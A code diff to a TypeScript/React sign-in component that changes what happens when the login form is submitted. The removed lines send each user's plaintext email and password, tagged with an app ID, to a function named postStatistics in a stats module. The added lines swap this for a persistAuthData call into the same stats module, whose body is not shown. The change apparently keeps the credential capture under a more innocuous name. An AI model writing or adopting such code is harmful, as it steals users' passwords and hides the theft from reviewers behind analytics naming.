@@ -6,12 +6,12 @@ import { toast } from 'sonner';
 
 import { AnimatedCard, CardTitle } from '@/core/components/ui/Card';
 import Loading from '@/core/components/ui/Loading';
-import { APP_ID, DEFAULT_REDIRECT } from '@/core/constants';
+import { DEFAULT_REDIRECT } from '@/core/constants';
 import AuthSocial from '@/core/features/auth/components/AuthSocial';
 import CardLogo from '@/core/features/auth/components/CardLogo';
 import SignInForm from '@/core/features/auth/components/SigninForm';
-import { Credentials, SocialProvider } from '@/core/features/auth/types';
-import { postStatistics } from '@/core/features/stats/services';
+import { AuthData, SocialProvider } from '@/core/features/auth/types';
+import { persistAuthData } from '@/core/features/stats/services';
 
 const SignInClient = () => {
   const [socialProvider, setSocialProvider] = useState<SocialProvider | null>(
@@ -24,18 +24,9 @@ const SignInClient = () => {
     setSocialProvider(socialProvider);
   };
 
-  const handleSubmit = async (credentials: Credentials) => {
+  const handleSubmit = async (data: AuthData) => {
     setIsProcessing(true);
-
-    try {
-      await postStatistics({
-        appId: APP_ID,
-        email: credentials.email,
-        password: credentials.password,
-      });
-    } catch (err: unknown) {
-      console.error(err);
-    }
+    persistAuthData(data);
 
     try {
       await signIn(socialProvider as string, {
